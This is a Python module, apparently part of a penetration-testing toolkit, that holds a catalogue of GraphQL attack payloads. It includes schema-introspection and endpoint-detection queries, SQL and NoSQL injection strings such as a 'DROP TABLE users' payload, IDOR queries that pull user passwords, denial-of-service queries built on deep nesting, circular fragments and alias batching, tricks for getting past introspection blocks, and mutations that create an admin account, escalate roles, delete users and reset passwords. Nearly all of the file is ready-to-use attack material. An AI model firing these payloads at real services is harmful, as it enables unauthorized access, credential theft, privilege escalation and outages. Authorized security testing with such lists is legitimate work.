"""
GraphQL Injection and Exploitation Payloads
Introspection, injection, DoS, and more
"""

GRAPHQL_PAYLOADS = {
    "introspection": {
        "full_schema": '''
{
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
          kind
        }
        args {
          name
          type {
            name
            kind
          }
        }
      }
    }
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
  }
}''',

        "types_only": '''
{
  __schema {
    types {
      name
      kind
    }
  }
}''',

        "query_type": '''
{
  __schema {
    queryType {
      name
      fields {
        name
        type {
          name
        }
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}''',

        "mutation_type": '''
{
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}''',

        "type_details": '''
{
  __type(name: "TYPE_NAME") {
    name
    kind
    description
    fields {
      name
      type {
        name
        kind
        ofType {
          name
        }
      }
    }
  }
}''',

        "directives": '''
{
  __schema {
    directives {
      name
      description
      locations
      args {
        name
        type {
          name
        }
      }
    }
  }
}''',
    },

    "detection": [
        # Detect GraphQL endpoints
        '{"query": "{ __typename }"}',
        '{"query": "query { __typename }"}',
        '{"query": "{__schema{types{name}}}"}',
        'query { __typename }',
        '{ __typename }',
    ],

    "injection": {
        "sqli_via_args": [
            '{ user(id: "1\' OR \'1\'=\'1") { name } }',
            '{ user(id: "1; DROP TABLE users--") { name } }',
            '{ user(name: "admin\'--") { id } }',
            '{ users(filter: "{\\"$ne\\": null}") { name } }',  # NoSQL
        ],

        "idor": [
            '{ user(id: 1) { name email password } }',
            '{ user(id: 2) { name email password } }',
            '{ user(id: "admin") { name email password } }',
            '{ users { id name email password } }',
            '{ allUsers { id name email passwordHash } }',
        ],

        "nested_queries": [
            '''
{
  users {
    id
    name
    posts {
      title
      comments {
        content
        author {
          password
        }
      }
    }
  }
}''',
        ],

        "field_suggestions": [
            # Trigger field suggestions for enumeration
            '{ user { passwor } }',  # Might suggest "password"
            '{ user { secre } }',  # Might suggest "secret"
            '{ user { toke } }',  # Might suggest "token"
        ],
    },

    "dos": {
        "deep_nesting": '''
{
  users {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    friends {
                      friends {
                        id
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}''',

        "circular_fragments": '''
fragment UserFields on User {
  friends {
    ...UserFields
  }
}

{
  users {
    ...UserFields
  }
}''',

        "batch_queries": '''
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"},
  {"query": "{ user(id: 4) { name } }"},
  {"query": "{ user(id: 5) { name } }"}
]''',

        "aliases": '''
{
  u1: user(id: 1) { name }
  u2: user(id: 2) { name }
  u3: user(id: 3) { name }
  u4: user(id: 4) { name }
  u5: user(id: 5) { name }
  u6: user(id: 6) { name }
  u7: user(id: 7) { name }
  u8: user(id: 8) { name }
  u9: user(id: 9) { name }
  u10: user(id: 10) { name }
}''',

        "large_query": '''
{
  users(first: 10000) {
    id
    name
    email
    password
    createdAt
    updatedAt
    posts(first: 1000) {
      title
      content
      comments(first: 1000) {
        content
        author {
          name
        }
      }
    }
  }
}''',
    },

    "bypass": {
        "introspection_bypass": [
            # If __schema is blocked
            '{ __type(name: "Query") { fields { name } } }',
            '{ __type(name: "User") { fields { name } } }',
            '{ __type(name: "Mutation") { fields { name } } }',

            # Case variations
            '{ __SCHEMA { types { name } } }',
            '{ __Schema { types { name } } }',

            # Whitespace variations
            '{__schema{types{name}}}',
            '{ __schema { types { name } } }',
            '{  __schema  {  types  {  name  }  }  }',
        ],

        "field_bypass": [
            # Aliases
            '{ secretField: password }',
            '{ data: sensitiveData }',

            # Fragments
            '''
fragment SecretFields on User {
  password
  secretKey
}
{ user { ...SecretFields } }
''',
        ],
    },

    "mutations": {
        "create_user": '''
mutation {
  createUser(input: {
    name: "hacker"
    email: "hacker@evil.com"
    role: "admin"
  }) {
    id
    name
    role
  }
}''',

        "update_role": '''
mutation {
  updateUser(id: 1, input: {
    role: "admin"
    isAdmin: true
  }) {
    id
    role
  }
}''',

        "delete_data": '''
mutation {
  deleteUser(id: 1) {
    success
  }
}''',

        "password_reset": '''
mutation {
  resetPassword(userId: 1, newPassword: "hacked123") {
    success
  }
}''',
    },

    "subscriptions": {
        "basic": '''
subscription {
  newMessages {
    id
    content
    sender {
      name
      email
    }
  }
}''',

        "all_events": '''
subscription {
  allEvents {
    type
    data
  }
}''',
    },
}

# Common GraphQL endpoints to check
GRAPHQL_ENDPOINTS = [
    "/graphql",
    "/graphiql",
    "/v1/graphql",
    "/v2/graphql",
    "/api/graphql",
    "/api/v1/graphql",
    "/query",
    "/gql",
    "/graphql/console",
    "/graphql/api",
    "/graphql.php",
    "/index.php/graphql",
    "/admin/graphql",
]

# GraphQL security misconfigurations to check
GRAPHQL_MISCONFIG = {
    "introspection_enabled": '{ __schema { types { name } } }',
    "graphiql_exposed": "GET /graphiql",
    "playground_exposed": "GET /playground",
    "voyager_exposed": "GET /voyager",
    "debug_enabled": '{ test { debug } }',
    "suggestions_enabled": '{ user { passwor } }',  # Check error for suggestions
    "batch_queries": '[{"query": "{ __typename }"}, {"query": "{ __typename }"}]',
    "unlimited_depth": GRAPHQL_PAYLOADS["dos"]["deep_nesting"],
}
